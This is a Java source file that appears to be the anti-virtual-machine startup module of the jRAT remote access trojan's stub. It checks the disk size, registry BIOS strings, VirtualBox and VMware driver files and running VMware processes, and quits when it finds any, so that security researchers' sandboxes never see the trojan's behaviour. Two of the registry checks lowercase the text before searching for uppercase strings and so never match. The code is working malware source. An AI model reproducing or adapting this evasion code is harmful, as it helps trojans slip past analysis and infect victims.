package se.jrat.stub.modules.startup;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.util.Map;

import se.jrat.stub.Configuration;

import com.redpois0n.oslib.OperatingSystem;

public class AntiVMStartupModule extends StartupModule {

	public AntiVMStartupModule(Map<String, String> config) {
		super(config);
	}

	public void run() throws Exception {
		try {
			if (Boolean.parseBoolean(Configuration.getConfig().get("vm"))) {
				try {
					File root = File.listRoots()[0];
					
					if (root.getTotalSpace() <= 1024 * 1024 * 1024) {
						System.exit(0);
					}
				} catch (Exception ex) {
					ex.printStackTrace();
				}
				
				if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
					Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", "hkey_local_machine\\HARDWARE\\DESCRIPTION\\SYSTEM" });

					BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

					String line;

					while ((line = reader.readLine()) != null) {
						String[] args = line.trim().split("    ");
						if (args.length >= 3) {
							if (args[0].equals("SystemBiosVersion") && args[2].toLowerCase().contains("VBOX")) {
								System.exit(0);
							} else if (args[0].equals("VideoBiosVersion") && args[2].toLowerCase().contains("Oracle VM VirtualBox")) {
								System.exit(0);
							}
						}
					}
					reader.close();
					
					if (new File("C:\\WINDOWS\\System32\\drivers\\VBoxMouse.sys").exists()) {
						System.exit(0);
					}
					
					if (new File("C:\\WINDOWS\\System32\\drivers\\vmmouse.sys").exists()) {
						System.exit(0);
					}
				} else {
					String command = "ps -ax";

					Process process = Runtime.getRuntime().exec(command);

					String total = "";

					BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));
					String s;
					while ((s = br.readLine()) != null) {
						total = total + s + "\n";
					}

					br.close();

					total = total.toLowerCase();

					boolean vm = total.contains("vmtoolsd") || (total.contains("vmware") && !total.contains("vmware-tray"));

					if (vm) {
						System.exit(0);
					}
				}
			}			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
